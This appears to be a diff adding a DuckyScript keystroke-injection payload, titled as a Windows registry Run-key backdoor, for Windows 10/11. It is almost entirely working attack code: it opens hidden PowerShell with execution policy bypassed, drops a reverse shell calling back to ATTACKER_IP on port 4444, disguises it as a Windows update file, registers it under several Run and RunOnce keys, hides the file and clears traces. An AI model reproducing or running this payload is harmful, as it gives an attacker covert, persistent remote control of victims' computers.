@@ -1,0 +1,83 @@
+REM ==========================================
+REM Title: Windows Registry Run Key Backdoor
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Installs persistence via
+REM   multiple Registry Run keys (HKCU and
+REM   HKLM). Drops a PowerShell reverse shell
+REM   script and registers it for auto-start
+REM   on user login.
+REM Category: Persistence
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Create hidden payload directory
+STRING $dir = "$env:APPDATA\Microsoft\Windows\Update"; New-Item -ItemType Directory -Path $dir -Force | Out-Null
+ENTER
+DELAY 400
+REM Generate reverse shell payload script
+STRING $payload = @'
+ENTER
+DELAY 300
+STRING $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
+ENTER
+DELAY 300
+STRING $stream = $client.GetStream()
+ENTER
+DELAY 300
+STRING [byte[]]$bytes = 0..65535|%{0}
+ENTER
+DELAY 300
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+ENTER
+DELAY 300
+STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
+ENTER
+DELAY 300
+STRING $sendback = (iex $data 2>&1 | Out-String)
+ENTER
+DELAY 300
+STRING $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+ENTER
+DELAY 300
+STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+ENTER
+DELAY 300
+STRING $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}
+ENTER
+DELAY 300
+STRING $client.Close()
+ENTER
+DELAY 300
+STRING '@
+ENTER
+DELAY 350
+REM Write payload to disk
+STRING $payload | Out-File "$dir\updater.ps1" -Force
+ENTER
+DELAY 400
+REM Set HKCU Run key (no admin needed)
+STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value "powershell -W Hidden -NoProfile -ExecutionPolicy Bypass -File `"$dir\updater.ps1`"" -Force
+ENTER
+DELAY 400
+REM Attempt HKLM Run key (needs admin)
+STRING Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemUpdate' -Value "powershell -W Hidden -NoProfile -ExecutionPolicy Bypass -File `"$dir\updater.ps1`"" -Force 2>$null
+ENTER
+DELAY 400
+REM Also set RunOnce for next reboot guaranteed execution
+STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'UpdateCheck' -Value "powershell -W Hidden -NoProfile -ExecutionPolicy Bypass -File `"$dir\updater.ps1`"" -Force
+ENTER
+DELAY 400
+REM Hide the payload file
+STRING (Get-Item "$dir\updater.ps1").Attributes = 'Hidden,System'
+ENTER
+DELAY 400
+REM Clean up and exit
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
